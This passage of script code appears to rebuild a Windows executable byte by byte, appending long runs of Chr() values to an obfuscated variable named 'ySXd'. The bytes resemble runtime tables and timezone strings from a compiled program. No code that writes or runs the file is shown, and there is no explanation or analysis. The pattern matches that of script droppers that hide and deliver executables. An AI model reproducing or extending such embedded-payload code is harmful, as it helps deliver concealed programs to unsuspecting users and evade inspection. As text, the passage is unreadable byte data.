ySXd=ySXd&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
ySXd=ySXd&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)
ySXd=ySXd&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
ySXd=ySXd&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
ySXd=ySXd&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(97)&Chr(98)&Chr(99)&Chr(100)&Chr(101)&Chr(102)&Chr(103)&Chr(104)&Chr(105)&Chr(106)&Chr(107)&Chr(108)&Chr(109)&Chr(110)&Chr(111)&Chr(112)&Chr(113)&Chr(114)&Chr(115)&Chr(116)&Chr(117)&Chr(118)&Chr(119)&Chr(120)&Chr(121)&Chr(122)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(65)&Chr(66)&Chr(67)&Chr(68)&Chr(69)&Chr(70)&Chr(71)&Chr(72)&Chr(73)&Chr(74)&Chr(75)
ySXd=ySXd&Chr(76)&Chr(77)&Chr(78)&Chr(79)&Chr(80)&Chr(81)&Chr(82)&Chr(83)&Chr(84)&Chr(85)&Chr(86)&Chr(87)&Chr(88)&Chr(89)&Chr(90)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
ySXd=ySXd&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(224)&Chr(163)&Chr(64)&Chr(0)&Chr(1)&Chr(2)&Chr(4)&Chr(8)&Chr(164)&Chr(3)&Chr(0)&Chr(0)&Chr(96)&Chr(130)&Chr(121)&Chr(130)&Chr(33)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(166)&Chr(223)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(161)&Chr(165)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(129)&Chr(159)&Chr(224)&Chr(252)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(64)&Chr(126)&Chr(128)&Chr(252)
ySXd=ySXd&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(168)&Chr(3)&Chr(0)&Chr(0)&Chr(193)&Chr(163)&Chr(218)&Chr(163)&Chr(32)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(129)&Chr(254)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(64)&Chr(254)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(181)&Chr(3)&Chr(0)&Chr(0)&Chr(193)&Chr(163)&Chr(218)&Chr(163)&Chr(32)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(129)&Chr(254)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(65)&Chr(254)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
ySXd=ySXd&Chr(182)&Chr(3)&Chr(0)&Chr(0)&Chr(207)&Chr(162)&Chr(228)&Chr(162)&Chr(26)&Chr(0)&Chr(229)&Chr(162)&Chr(232)&Chr(162)&Chr(91)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(129)&Chr(254)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(64)&Chr(126)&Chr(161)&Chr(254)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(81)&Chr(5)&Chr(0)&Chr(0)&Chr(81)&Chr(218)&Chr(94)&Chr(218)&Chr(32)&Chr(0)&Chr(95)&Chr(218)&Chr(106)&Chr(218)&Chr(50)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(129)&Chr(211)&Chr(216)&Chr(222)&Chr(224)&Chr(249)&Chr(0)&Chr(0)&Chr(49)&Chr(126)&Chr(129)&Chr(254)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(236)&Chr(139)&Chr(64)&Chr(0)
ySXd=ySXd&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(67)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
ySXd=ySXd&Chr(8)&Chr(169)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(8)&Chr(169)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(8)&Chr(169)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(8)&Chr(169)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(8)&Chr(169)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
ySXd=ySXd&Chr(224)&Chr(170)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(232)&Chr(137)&Chr(64)&Chr(0)&Chr(112)&Chr(142)&Chr(64)&Chr(0)&Chr(240)&Chr(143)&Chr(64)&Chr(0)&Chr(32)&Chr(170)&Chr(64)&Chr(0)&Chr(16)&Chr(169)&Chr(64)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(16)&Chr(169)&Chr(64)&Chr(0)&Chr(224)&Chr(163)&Chr(64)&Chr(0)&Chr(78)&Chr(230)&Chr(64)&Chr(187)&Chr(177)&Chr(25)&Chr(191)&Chr(68)&Chr(3)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(232)&Chr(137)&Chr(64)&Chr(0)&Chr(234)&Chr(139)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(24)&Chr(146)&Chr(64)&Chr(0)&Chr(20)&Chr(146)&Chr(64)&Chr(0)&Chr(16)&Chr(146)&Chr(64)&Chr(0)&Chr(12)&Chr(146)&Chr(64)&Chr(0)
ySXd=ySXd&Chr(8)&Chr(146)&Chr(64)&Chr(0)&Chr(4)&Chr(146)&Chr(64)&Chr(0)&Chr(0)&Chr(146)&Chr(64)&Chr(0)&Chr(248)&Chr(145)&Chr(64)&Chr(0)&Chr(240)&Chr(145)&Chr(64)&Chr(0)&Chr(232)&Chr(145)&Chr(64)&Chr(0)&Chr(220)&Chr(145)&Chr(64)&Chr(0)&Chr(208)&Chr(145)&Chr(64)&Chr(0)&Chr(200)&Chr(145)&Chr(64)&Chr(0)&Chr(188)&Chr(145)&Chr(64)&Chr(0)&Chr(184)&Chr(145)&Chr(64)&Chr(0)&Chr(180)&Chr(145)&Chr(64)&Chr(0)&Chr(176)&Chr(145)&Chr(64)&Chr(0)&Chr(172)&Chr(145)&Chr(64)&Chr(0)&Chr(168)&Chr(145)&Chr(64)&Chr(0)&Chr(164)&Chr(145)&Chr(64)&Chr(0)&Chr(160)&Chr(145)&Chr(64)&Chr(0)&Chr(156)&Chr(145)&Chr(64)&Chr(0)&Chr(152)&Chr(145)&Chr(64)&Chr(0)&Chr(148)&Chr(145)&Chr(64)&Chr(0)&Chr(144)&Chr(145)&Chr(64)&Chr(0)&Chr(140)&Chr(145)&Chr(64)&Chr(0)&Chr(132)&Chr(145)&Chr(64)&Chr(0)&Chr(120)&Chr(145)&Chr(64)&Chr(0)&Chr(112)&Chr(145)&Chr(64)&Chr(0)
ySXd=ySXd&Chr(104)&Chr(145)&Chr(64)&Chr(0)&Chr(168)&Chr(145)&Chr(64)&Chr(0)&Chr(96)&Chr(145)&Chr(64)&Chr(0)&Chr(88)&Chr(145)&Chr(64)&Chr(0)&Chr(80)&Chr(145)&Chr(64)&Chr(0)&Chr(68)&Chr(145)&Chr(64)&Chr(0)&Chr(60)&Chr(145)&Chr(64)&Chr(0)&Chr(48)&Chr(145)&Chr(64)&Chr(0)&Chr(36)&Chr(145)&Chr(64)&Chr(0)&Chr(32)&Chr(145)&Chr(64)&Chr(0)&Chr(28)&Chr(145)&Chr(64)&Chr(0)&Chr(16)&Chr(145)&Chr(64)&Chr(0)&Chr(252)&Chr(144)&Chr(64)&Chr(0)&Chr(240)&Chr(144)&Chr(64)&Chr(0)&Chr(9)&Chr(4)&Chr(0)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(32)&Chr(170)&Chr(64)&Chr(0)&Chr(46)&Chr(0)&Chr(0)&Chr(0)&Chr(220)&Chr(170)&Chr(64)&Chr(0)&Chr(196)&Chr(178)&Chr(64)&Chr(0)&Chr(196)&Chr(178)&Chr(64)&Chr(0)&Chr(196)&Chr(178)&Chr(64)&Chr(0)&Chr(196)&Chr(178)&Chr(64)&Chr(0)&Chr(196)&Chr(178)&Chr(64)&Chr(0)
ySXd=ySXd&Chr(196)&Chr(178)&Chr(64)&Chr(0)&Chr(196)&Chr(178)&Chr(64)&Chr(0)&Chr(196)&Chr(178)&Chr(64)&Chr(0)&Chr(196)&Chr(178)&Chr(64)&Chr(0)&Chr(127)&Chr(127)&Chr(127)&Chr(127)&Chr(127)&Chr(127)&Chr(127)&Chr(127)&Chr(224)&Chr(170)&Chr(64)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(46)&Chr(0)&Chr(0)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(32)&Chr(5)&Chr(147)&Chr(25)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(112)&Chr(0)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(240)&Chr(241)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(80)&Chr(83)&Chr(84)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
ySXd=ySXd&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(80)&Chr(68)&Chr(84)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
ySXd=ySXd&Chr(64)&Chr(171)&Chr(64)&Chr(0)&Chr(128)&Chr(171)&Chr(64)&Chr(0)&Chr(255)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(255)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(255)&Chr(255)&Chr(255)&Chr(255)&Chr(30)&Chr(0)&Chr(0)&Chr(0)&Chr(59)&Chr(0)&Chr(0)&Chr(0)&Chr(90)&Chr(0)&Chr(0)&Chr(0)&Chr(120)&Chr(0)&Chr(0)&Chr(0)&Chr(151)&Chr(0)&Chr(0)&Chr(0)&Chr(181)&Chr(0)&Chr(0)&Chr(0)&Chr(212)&Chr(0)&Chr(0)&Chr(0)&Chr(243)&Chr(0)&Chr(0)&Chr(0)&Chr(17)&Chr(1)&Chr(0)&Chr(0)&Chr(48)&Chr(1)&Chr(0)&Chr(0)&Chr(78)&Chr(1)&Chr(0)&Chr(0)&Chr(109)&Chr(1)&Chr(0)&Chr(0)&Chr(255)&Chr(255)&Chr(255)&Chr(255)&Chr(30)&Chr(0)&Chr(0)&Chr(0)&Chr(58)&Chr(0)&Chr(0)&Chr(0)&Chr(89)&Chr(0)&Chr(0)&Chr(0)
ySXd=ySXd&Chr(119)&Chr(0)&Chr(0)&Chr(0)&Chr(150)&Chr(0)&Chr(0)&Chr(0)&Chr(180)&Chr(0)&Chr(0)&Chr(0)&Chr(211)&Chr(0)&Chr(0)&Chr(0)&Chr(242)&Chr(0)&Chr(0)&Chr(0)&Chr(16)&Chr(1)&Chr(0)&Chr(0)&Chr(47)&Chr(1)&Chr(0)&Chr(0)&Chr(77)&Chr(1)&Chr(0)&Chr(0)&Chr(108)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
ySXd=ySXd&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
ySXd=ySXd&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
ySXd=ySXd&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
